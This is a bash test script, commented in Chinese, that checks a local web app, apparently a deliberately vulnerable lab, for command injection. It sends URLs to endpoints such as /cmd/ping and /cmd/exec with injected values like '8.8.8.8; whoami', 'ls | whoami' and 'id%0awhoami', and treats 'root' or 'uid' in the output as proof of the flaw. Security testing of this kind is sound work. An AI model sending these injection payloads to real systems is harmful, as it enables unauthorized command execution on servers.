#!/bin/bash
# 命令注入漏洞验证脚本

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}命令注入漏洞验证脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if echo "$response" | grep -qiE "$pattern"; then
        echo -e "  ${GREEN}[✓] 存在漏洞${NC}"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 测试失败${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== 命令注入测试 ===${NC}"

test_case "Ping 命令注入" \
    "${BASE_URL}/cmd/ping?ip=8.8.8.8; whoami" \
    "root|user"

test_case "管道命令" \
    "${BASE_URL}/cmd/exec?cmd=ls | whoami" \
    "root|user"

test_case "后台命令" \
    "${BASE_URL}/cmd/bg?cmd=sleep 5 & whoami" \
    "root|user"

test_case "反引号执行" \
    "${BASE_URL}/cmd/backtick?cmd=id" \
    "uid|gid"

test_case "换行执行" \
    "${BASE_URL}/cmd/newline?cmd=id%0awhoami" \
    "uid|gid"

# 信息端点
echo -e "\n${YELLOW}[*] 命令注入信息端点:${NC}"
info=$(curl -s "${BASE_URL}/cmd/info" 2>/dev/null)
echo "$info" | head -10

# 总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
